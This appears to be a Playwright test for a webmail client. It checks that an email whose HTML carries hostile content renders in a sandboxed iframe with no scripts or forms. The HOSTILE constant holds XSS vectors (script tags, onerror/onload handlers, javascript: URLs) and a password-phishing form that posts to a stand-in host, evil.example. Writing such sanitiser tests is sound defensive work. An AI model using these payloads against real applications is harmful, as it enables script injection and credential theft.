import { expect, test } from "@playwright/test";
import { login, rowOf } from "./support/app";
import { accounts } from "./support/env";
import { appendMessage, deleteTagged, runTag } from "./support/imap";

/**
 * DoD Faza 3: a message with <script>, onerror=, javascript: and a form renders without running
 * any JS and without the form.
 */
const tag = runTag("xss");
const { dev1 } = accounts;

test.afterAll(async () => {
  await deleteTagged(dev1, tag);
});

const HOSTILE = `<!doctype html><html><head>
<script>window.parent.__xss = 'script'; alert('script')</script>
<meta http-equiv="refresh" content="0;url=javascript:alert('refresh')">
</head><body>
<p id="tekst">Zwykła treść wiadomości.</p>
<img src="x" onerror="window.parent.__xss='onerror'; alert('onerror')">
<svg onload="window.parent.__xss='svg'; alert('svg')"><circle r="5"/></svg>
<a id="link" href="javascript:window.parent.__xss='href';alert('href')">Kliknij</a>
<iframe src="javascript:alert('iframe')"></iframe>
<form id="form" action="https://evil.example/steal" method="post">
  <input name="password" type="password"><button type="submit">Zaloguj</button>
</form>
<div style="background:url(javascript:alert('css'))">styl</div>
</body></html>`;

test("hostile HTML renders without running JS and without the form", async ({ page }) => {
  const subject = `${tag} Faktura do zapłaty`;
  await appendMessage(dev1, "inbox", {
    from: "Atak <atak@example.com>",
    to: dev1.email,
    subject,
    html: HOSTILE,
  });

  const dialogs: string[] = [];
  const consoleMessages: string[] = [];
  page.on("dialog", (d) => {
    dialogs.push(d.message());
    void d.dismiss();
  });
  page.on("console", (m) => consoleMessages.push(m.text()));
  const navigations: string[] = [];
  page.on("request", (r) => {
    if (r.url().includes("evil.example")) navigations.push(r.url());
  });

  await login(page, dev1);
  await rowOf(page, subject).click({ timeout: 15_000 });
  await expect(page.getByRole("heading", { name: subject })).toBeVisible();
  const iframe = page.locator("iframe[title^='Message body']").last();
  await expect(iframe).toBeVisible();
  const frame = page.frameLocator("iframe[title^='Message body'] >> nth=-1");
  await expect(frame.getByText("Zwykła treść wiadomości.")).toBeVisible();

  // The sandbox has no allow-scripts; the sanitised document has no script, handler or form.
  expect(await iframe.getAttribute("sandbox")).not.toContain("allow-scripts");
  const srcdoc = (await iframe.getAttribute("srcdoc")) ?? "";
  expect(srcdoc).not.toMatch(/<script/i);
  expect(srcdoc).not.toMatch(/\son\w+\s*=/i);
  expect(srcdoc).not.toMatch(/javascript:/i);
  expect(srcdoc).not.toMatch(/<form/i);
  await expect(frame.locator("form")).toHaveCount(0);
  await expect(frame.locator("input[type=password]")).toHaveCount(0);

  // Clicking the former javascript: link does nothing either.
  await frame.getByText("Kliknij").click();
  await page.waitForTimeout(1_000);
  expect(dialogs).toEqual([]);
  expect(
    await page.evaluate(() => (window as unknown as { __xss?: string }).__xss),
  ).toBeUndefined();
  expect(navigations).toEqual([]);
  expect(consoleMessages.filter((m) => /xss|alert/i.test(m))).toEqual([]);
});
